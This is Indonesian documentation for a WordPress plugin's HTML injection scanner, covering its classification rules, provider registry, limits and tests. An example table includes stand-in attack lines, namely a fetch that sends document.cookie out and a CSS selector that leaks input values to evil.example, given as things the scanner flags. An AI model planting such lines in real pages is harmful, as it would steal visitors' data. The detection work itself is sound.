# Contextual scanner filtering — 2.7.30

Perubahan memperluas **HTML Injection Scanner** yang sudah ada, bukan membuat
scanner baru atau mengganti Malware Scanner. Endpoint start/step/cancel/clear,
cursor database, sesi admin, laporan tersimpan, navigasi, dan mode read-only
dipertahankan. Scanner PHP/file dan File Integrity Monitoring tetap tersedia.

## Alur deteksi

1. DOM memisahkan elemen, atribut, script, style dan iframe srcdoc yang aktif dari
   komentar, teks contoh, JSON dan JSON-LD.
2. Lexer memisahkan string/comment JavaScript dan mendekode escape ASCII yang
   didukung. Pola aman harus cocok dengan seluruh grammar/token stream, bukan
   sekadar substring. Kode tidak pernah dieksekusi.
3. URL diperiksa untuk scheme, host persis, port, userinfo, path, parameter, dan
   origin. Provider yang dikenal terpisah dari custom trusted domains.
4. Bukti risiko dinilai sebelum menentukan REPORT, REVIEW, atau SKIP. Setiap
   atribut dan perilaku lain tetap diperiksa. Unsafe tambahan tidak ikut aman
   karena ada handler CSS atau hostname provider yang dikenal.
5. Temuan diberi fingerprint SHA-256, digabung bila sumber/lokasi/buktinya sama,
   lalu ditampilkan pada bagian laporan yang sesuai. Suppression bukan penghapusan
   bukti; metadata, timestamp dan jumlah kemunculannya disimpan.

## Aturan klasifikasi dan suppression

| Rule ID / perilaku | Syarat | Hasil |
|---|---|---|
| `SAFE_CSS_STYLESHEET_001` | Link stylesheet/preload style, URL CSS lokal atau tujuan CSS yang disetujui, tidak memiliki event handler | INFO / expected_behavior / SKIP |
| `SAFE_CSS_ONLOAD_001` | Stylesheet `media=print` + hanya assignment `this.media='all'`, atau preload `as=style` + hanya `this.rel='stylesheet'`; optional `this.onload=null`; tujuan CSS tervalidasi dan tidak ada event lain | INFO / expected_behavior / SKIP |
| `SAFE_PROVIDER_SCRIPT_001` | Elemen script dengan URL provider HTTPS, host/path/parameter disetujui, tanpa handler atau isi inline tambahan | INFO / recognized_integration / SKIP |
| `SAFE_DYNAMIC_INTEGRATION_001` | Seluruh loader cocok dengan grammar literal `createElement`/`appendChild` atau snippet GTM standar, tujuan provider disetujui, tidak ada statement tambahan | INFO / recognized_integration / SKIP |
| `SAFE_STORED_INTEGRATION_001` | Script database memenuhi aturan integrasi di atas atau grammar konfigurasi gtag standar | INFO / recognized_integration / SKIP |
| `event_handler` lain | Handler tidak cocok dengan grammar aman | LOW/MEDIUM / REVIEW; REPORT bila ada transport pada load/error atau bukti risiko yang lebih kuat |
| `dynamic_script_loader` lain | Loader/destination belum dapat diverifikasi | MEDIUM / unknown_integration / REVIEW; input pengguna ke source, pengiriman sensitif, atau transport tak aman meningkatkan risiko |
| `cookie_outbound` | Read cookie/storage/form sensitif + transport | HIGH / REPORT jika data terlihat dalam ekspresi transport; MEDIUM / REVIEW jika baru koeksistensi dan alur data belum terbukti |
| `dynamic_execution`, `encoded_execution` | Eksekusi dinamis atau decode→execution | MEDIUM / REVIEW; HIGH / REPORT bila didukung input pengguna/data sensitif yang relevan |
| `css_exfiltration` | Selector nilai/field sensitif memicu URL lintas origin | HIGH / REPORT, termasuk jika host provider/custom dipercaya |
| `css_expression`, `css_executable_url` | Function expression legacy atau scheme executable dalam URL CSS | MEDIUM atau HIGH / REPORT sesuai dampak |
| `css_external_import`, `css_external_resource` | Tujuan resource belum ditinjau | MEDIUM atau LOW / REVIEW, bukan otomatis malware |
| `css_concealed_overlay` | Overlay transparan/fixed dengan stacking ekstrem **dan** resource eksternal tak dikenal | MEDIUM / REVIEW; properti layout biasa tidak cukup |
| `CSS_BASELINE_CHANGED_001` | Hash stylesheet berubah dari referensi awal | LOW / integrity_change / REVIEW; update sah tetap mungkin |
| `unparsed_javascript` | Script memiliki indikator perilaku tetapi syntax/budget di luar grammar yang didukung | LOW / REVIEW, tidak pernah otomatis di-SKIP; syntax tak didukung saja tidak dibuat menjadi temuan |

Severity CRITICAL tetap didukung untuk bukti yang memang sepadan, tetapi tidak
dibuat otomatis hanya karena menemukan `eval()`, tag script atau loader dinamis.
Confidence adalah keyakinan heuristik pada klasifikasi, bukan peluang eksploitasi.
Temuan yang dipulihkan admin memiliki classification `administrator_restored` dan
masuk REVIEW, dengan alasan/rule/bukti asli tetap tersedia.

## Registry provider

Default Google Analytics/Tag Manager memakai host `www.googletagmanager.com`
dengan path `/gtag/js` atau `/gtm.js` dan ID tag/container yang valid; endpoint
`/analytics.js` hanya berlaku pada `www.google-analytics.com`. Nama domain tiruan,
userinfo, port selain HTTPS standar, callback/parameter asing, dan path arbitrer
tidak disetujui. Google Fonts memakai path CSS yang disetujui pada
`fonts.googleapis.com`; font assets yang sesuai pada `fonts.gstatic.com` ditangani
sebagai resource font. Font Awesome dan AOS mengenali path CSS library versi
numerik tertentu pada `cdnjs.cloudflare.com`, bukan seluruh CDN.

Administrator mengelola **hostname custom persis** melalui form scanner yang
sudah ada; daftar disimpan saat Start New Scan. Nama custom saja tidak menyetujui
JavaScript arbitrer. Developer dapat menambah registry dengan host dan path
eksplisit melalui filter berikut:

```php
add_filter('tk_html_scan_recognized_providers', function ($providers) {
    $providers['approved_widget'] = array(
        'name' => 'Approved Widget',
        'hosts' => array('widgets.example.com'),
        'script_paths' => array('/v1/loader.js'),
        'style_paths' => array('/v1/widget.css'),
    );
    return $providers;
});
```

Path terdaftar masih memerlukan konteks elemen/grammar loader yang sesuai.
`style_patterns`/`script_patterns` dapat dipakai oleh kode konfigurasi tepercaya
untuk grammar path yang di-anker penuh; jangan membuat pola wildcard longgar.
Konfigurasi ini menambahkan pengenalan statis, bukan pemeriksaan integritas
konten remote atau kepemilikan akun provider.

## Contoh sebelum dan sesudah

| Contoh | Sebelum | Sesudah |
|---|---|---|
| `<link rel=stylesheet href=/style.css media=print onload="this.media='all'">` | MEDIUM event_handler | INFO / SKIP, audit `SAFE_CSS_ONLOAD_001` |
| Preload style yang hanya mengubah `rel` | MEDIUM event_handler | INFO / SKIP setelah validasi tujuan dan konteks |
| Loader Google dengan URL gtag yang valid + appendChild, tanpa tambahan | MEDIUM dynamic_script_loader | INFO / SKIP, recognized_integration |
| URL Google tetapi path `/evil.js`, domain suffix penyerang, atau handler tambahan | Tujuan bisa dikurangi oleh host trust | Tetap REVIEW/REPORT; tidak lolos registry/grammar |
| `this.media='all'; maliciousFunction()` | MEDIUM event_handler | Tetap REVIEW; bukan safe handler |
| Handler yang sama menuju `https://attacker.example/style.css` | MEDIUM event_handler | REVIEW untuk handler dan destination |
| `fetch('https://www.google-analytics.com/collect?x='+document.cookie)` | Host trust bisa mengurangi indikasi outbound | HIGH / REPORT; host dikenal tidak menyetujui pengiriman cookie |
| Empat halaman berisi loader/header identik pada lokasi yang sama | Empat baris temuan | Satu grup, empat occurrence, empat affected pages |
| `input[value^="a"]{background:url(https://evil.example/leak)}` | Tidak ada analisis CSS khusus | HIGH / REPORT, css_exfiltration |
| CSS `background:url(/images/bg.png)` atau data PNG biasa | Tidak dianalisis khusus | Tidak menjadi temuan keamanan |

Fingerprint memasukkan rule ID, kategori sumber, lokasi DOM/atribut atau sumber
file/row, hash bukti lengkap (sebelum pemotongan snippet), dan resource identifier.
Nonce request pada elemen tidak ikut hash. URL halaman dipakai sebagai daftar
affected pages, bukan identitas untuk markup publik yang sama. Dua lokasi DOM,
field nested, row database, file atau bukti berbeda tidak digabung hanya karena
cuplikan pendeknya terlihat sama.

## CSS, batching dan pembatasan beban

CSS lokal ditemukan dari stylesheet link, inline style/import dan import file
lokal lainnya. Path harus berada di root asset WordPress yang diizinkan, dengan
validasi URL, decoding aman, realpath dan ekstensi akhir `.css`; symlink yang
keluar root atau menunjuk PHP ditolak. Scanner tidak mengunduh CSS/script eksternal.

Satu file lokal hanya diantrikan sekali walaupun query `ver`/halaman pemakainya
berbeda. Hasil analisis isi identik pada direktori dasar yang sama digunakan ulang
melalui cache hash per job. Parser HTML memiliki cache kecil per batch. Batch
tetap lima row database, satu request publik dengan timeout delapan detik, atau
dua file CSS. Batasnya 512 KiB/sumber, 100 file CSS per scan, 300 hash referensi,
40 temuan risiko dan 80 audit detail per sumber, serta masing-masing 300 grup
temuan dan audit per laporan. Batas detail audit menyimpan jumlah/ringkasan rule
overflow dan menandai cakupan terbatas. Budget audit tidak menghentikan pencarian
ancaman; di dalam satu sumber, bukti berisiko lebih tinggi diprioritaskan atas
pengamatan lemah bila budget temuan penuh.

Semua pekerjaan terjadi setelah tindakan manual, dalam request AJAX berurutan
yang dapat dihentikan/dilanjutkan. Tidak ada full scan pada render dashboard,
request pengunjung, atau cron otomatis. Job terkontrol ini mempertahankan cara
kerja batch plugin sehingga tidak membutuhkan worker/daemon baru pada shared
hosting. Tab perlu terbuka agar batch berikutnya dilanjutkan.

## Upgrade dan database

Tidak ada tabel, kolom atau migrasi SQL baru. Data situs tidak diubah.

| Option | Kegunaan |
|---|---|
| `tk_html_scan_report` | Format laporan diperluas (`schema_version=2`), mempertahankan `findings`, `counts`, status dan bukti lama; menambah suppressed, statistik dan grup |
| `tk_html_scan_settings` | Pengaturan yang sudah ada; hostname baru harus persis |
| `tk_html_scan_restored` | Maksimal 300 override fingerprint beserta admin dan waktu restore |
| `tk_html_scan_css_baseline` | Maksimal 300 hash referensi CSS yang pertama kali dipindai secara manual |
| `tk_html_scan_lock`, `tk_html_scan_step_lock` | Lock sesi dan operasi laporan yang sudah ada, dipakai juga untuk mencegah race restore/start/clear |

Options khusus scanner tidak autoload, tidak memicu purge page cache, dan tidak
ditulis pada request frontend biasa. Hasil analisis/progres tetap memakai
transient sesi yang kedaluwarsa. Laporan lama tetap terlihat sebagai
`legacy_unverified`; tidak otomatis diubah menjadi aman. Hentikan/resume sesi lama
sesuai kebutuhan, lalu jalankan scan baru untuk klasifikasi penuh. Replace
`*.example.com` lama dengan daftar hostname persis pada form scanner.

Clear Report hanya menghapus laporan. Ia tidak menghapus referensi hash atau
override admin. Jika administrator memang ingin membuat referensi baru setelah
memverifikasi deployment atau menghapus seluruh override, tindakan metadata
eksplisit lewat WP-CLI dapat dipakai:

```sh
wp option delete tk_html_scan_css_baseline
wp option delete tk_html_scan_restored
```

Jalankan hanya perintah yang sesuai keputusan admin; scanner tidak menjalankannya
otomatis. Referensi hash pertama bukan attestasi bahwa versi awal bersih.

## File yang ditambah/diubah untuk pekerjaan ini

* `includes/html-injection-engine.php`: deteksi yang sudah ada, klasifikasi dan pipeline konteks.
* `includes/html-injection-context.php` (baru): lexer, grammar approved, URL dan registry provider.
* `includes/html-injection-css.php` (baru): parser/analisis risiko CSS.
* `includes/html-injection-report.php` (baru): fingerprint, statistik, audit dan restore.
* `includes/html-injection-resources.php` (baru): antrean CSS lokal, path safety, cache/hash referensi.
* `includes/html-injection-view.php` (baru): tiga bagian laporan, metadata dan tujuh filter.
* `includes/html-injection-scanner.php`: integrasi batch, state, izin/nonce dan lock operasi.
* `assets/html-injection-scanner.js`, `assets/html-injection-scanner.css` (CSS baru): UI laporan/filter/restore.
* `scripts/html-injection-engine-regression.php`, `scripts/html-injection-context-regression.php` (baru), `scripts/html-injection-scanner-regression.php`, `scripts/html-injection-ui-regression.cjs`: regresi engine, adversarial, backend dan UI.
* `scripts/html-injection-browser-fixture.php`, `scripts/html-injection-browser-regression.py` (baru): integrasi render PHP + JavaScript pada browser nyata.
* `scripts/regression-tests.cjs`: mendaftarkan tes scanner pada suite reguler.
* `tool-kits.php`, `readme.txt`: metadata versi 2.7.30 dan changelog.
* `HTML_INJECTION_SCANNER.md`, dokumen ini: panduan, perubahan perilaku dan batas cakupan.

## Pengujian dan batas yang masih ada

Kasus otomatis mencakup CSS normal/WordPress/Elementor/Gutenberg/library, pola
onload/preload, loader Google, mutasi payload, URL/hostname menipu, pemakaian host
terpercaya untuk exfiltration, severity eval/obfuscation, CSS selector exfiltration,
dedup lintas halaman dan pemisahan lokasi berbeda, budget yang mendahulukan
ancaman, restore dan permission/nonce, path traversal/symlink/file PHP tersamar,
baseline berubah, serta tujuh filter dan rendering bukti yang aman. Suite browser
menguji DOM nyata, filter dan restore dengan respons lokal terkontrol serta
memastikan tidak ada request otomatis. Pengujian tidak memuat database produksi.

```sh
node scripts/regression-tests.cjs
TK_PHP_BINARY=/path/to/php74 node scripts/regression-tests.cjs
python3 scripts/html-injection-browser-regression.py
```

Lexer/grammar yang dibatasi ini bukan parser AST JavaScript penuh, interpreter,
analisis taint antarfungsi, atau browser sandbox. Syntax template, unicode/escape
yang tidak didukung, loader yang dimodifikasi, dan alur data yang belum terbukti
tetap membutuhkan review; tidak disembunyikan atas dasar perkiraan. Nilai yang
dibentuk melalui alias/obfuscation kompleks mungkin tidak dapat diklasifikasikan
secara spesifik. DOM/libxml memiliki perbedaan dengan parser HTML5 browser.

Pengenalan provider memverifikasi struktur kode dan tujuan statis yang disetujui,
bukan isi remote, redirect aktual di endpoint script/CSS, integritas CDN, akun
Google atau isi container GTM. Redirect homepage yang dicrawl tetap ditolak.
CSS runtime dari JavaScript, shadow DOM, CSS di luar root yang diizinkan, file
PHP/JS dan seluruh URL situs berada di luar cakupan modul ini. Gunakan Malware
Scanner/FIM dan pemeriksaan browser/deployment untuk lapisan tersebut. Laporan
bersih atau banyak INFO bukan jaminan situs bebas kompromi.

Referensi pola provider: [Google tag](https://developers.google.com/tag-platform/gtagjs),
[Google Tag Manager](https://developers.google.com/tag-platform/tag-manager/web).
